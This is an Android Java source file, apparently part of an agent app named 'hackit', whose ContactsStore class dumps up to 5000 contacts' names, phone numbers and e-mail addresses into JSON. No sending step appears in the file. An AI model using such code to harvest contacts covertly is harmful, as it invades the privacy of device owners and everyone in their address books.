package com.hackit.agent;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.Phone;

import org.json.JSONArray;
import org.json.JSONObject;

/** Contacts with every phone number and e-mail folded per person. */
final class ContactsStore {
    static JSONArray dump(Context ctx, int limit) {
        JSONArray rows = new JSONArray();
        if (!Common.granted(ctx, android.Manifest.permission.READ_CONTACTS)) {
            return rows;
        }
        Cursor cursor = null;
        try {
            String[] projection = {
                    Phone.CONTACT_ID, Phone.DISPLAY_NAME, Phone.NUMBER, Phone.TYPE, Phone.LABEL,
            };
            cursor = ctx.getContentResolver().query(
                    Phone.CONTENT_URI, projection, null, null, Phone.DISPLAY_NAME + " ASC");
            if (cursor == null) {
                return rows;
            }
            int cap = Math.min(Math.max(limit, 1), 5000);
            while (cursor.moveToNext() && rows.length() < cap) {
                JSONObject row = new JSONObject();
                row.put("contact", cursor.getLong(0));
                row.put("name", nullSafe(cursor.getString(1)));
                row.put("number", nullSafe(cursor.getString(2)));
                row.put("type", cursor.getInt(3));
                row.put("label", nullSafe(cursor.getString(4)));
                rows.put(row);
            }
        } catch (Throwable exc) {
            Log.e("contacts: " + exc);
        } finally {
            Common.closeQuietly(cursor);
        }
        return rows;
    }

    /** Optional second pass, called only when the first page filled the cap. */
    static JSONArray emails(Context ctx, int limit) {
        JSONArray rows = new JSONArray();
        if (!Common.granted(ctx, android.Manifest.permission.READ_CONTACTS)) {
            return rows;
        }
        Cursor cursor = null;
        try {
            cursor = ctx.getContentResolver().query(
                    Email.CONTENT_URI, new String[]{Email.CONTACT_ID, Email.ADDRESS},
                    null, null, Email.CONTACT_ID + " ASC");
            if (cursor == null) {
                return rows;
            }
            int cap = Math.min(Math.max(limit, 1), 5000);
            while (cursor.moveToNext() && rows.length() < cap) {
                JSONObject row = new JSONObject();
                row.put("contact", cursor.getLong(0));
                row.put("email", nullSafe(cursor.getString(1)));
                rows.put(row);
            }
        } catch (Throwable exc) {
            Log.d("contacts email: " + exc);
        } finally {
            Common.closeQuietly(cursor);
        }
        return rows;
    }

    private static String nullSafe(String value) {
        return value == null ? "" : value;
    }

    private ContactsStore() {
    }
}
